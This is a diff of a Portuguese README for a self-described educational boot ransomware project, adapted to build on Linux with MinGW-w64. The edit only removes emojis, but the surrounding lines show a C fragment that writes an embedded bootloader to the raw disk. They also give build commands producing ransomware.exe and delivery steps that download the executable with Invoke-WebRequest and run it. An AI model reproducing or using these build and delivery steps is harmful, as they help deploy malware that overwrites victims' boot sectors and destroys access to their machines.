@@ -3,11 +3,11 @@
 
 Este repositório documenta a adaptação de um projeto educacional de ransomware de boot, originalmente desenvolvido para Windows (Visual Studio), para ser compilado no Linux utilizando Mingw-w64 e recursos embutidos (dropper technique).
 
-## 🛠️ Adaptação para Linux
+## Adaptação para Linux
 
 O código original foi modificado para ser compilado no Linux utilizando a toolchain **MinGW-w64**, eliminando a dependência do Visual Studio.
 
-### 📝 Modificações no Código
+### Modificações no Código
 
 #### 1. Correção do include (case-sensitive)
 ```c\
@@ -44,7 +44,7 @@ memcpy(cInfected, bootloader, bootloaderSize);
 WriteFile(hDisk, cInfected, bootloaderSize, ...);
 ```
 
-## 📦 Pré-requisitos (Linux)
+## Pré-requisitos (Linux)
 
 ```bash\
 # Instalar o FASM (assembler)
@@ -55,7 +55,7 @@ WriteFile(hDisk, cInfected, bootloaderSize, ...);
 sudo apt-get install gcc-mingw-w64-i686 mingw-w64-i686-dev
 ```
 
-## 🔨 Processo de Build
+## Processo de Build
 
 ### Passo 1: Montar o bootloader
 ```bash\
@@ -75,7 +75,7 @@ objcopy -I binary -O pe-i386 -B i386 ransom.bin ransom.o
 i686-w64-mingw32-gcc -o ransomware.exe main1.c ransom.o -I/usr/i686-w64-mingw32/include -lntdll -static
 ```
 
-## 🚀 Entrega e Execução
+## Entrega e Execução
 
 ### Servindo o executável (Linux)
 ```bash\
@@ -92,7 +92,7 @@ Invoke-WebRequest -Uri "http://<IP_DO_LINUX>:8000/ransomware.exe" -OutFile "rans
 .\ransomware.exe
 ```
 
-## ⚠️ Aviso Legal
+## Aviso Legal
 
 Este projeto é **estritamente educacional**. O código deve ser utilizado apenas em ambientes controlados (VMs) para fins de aprendizado.
 
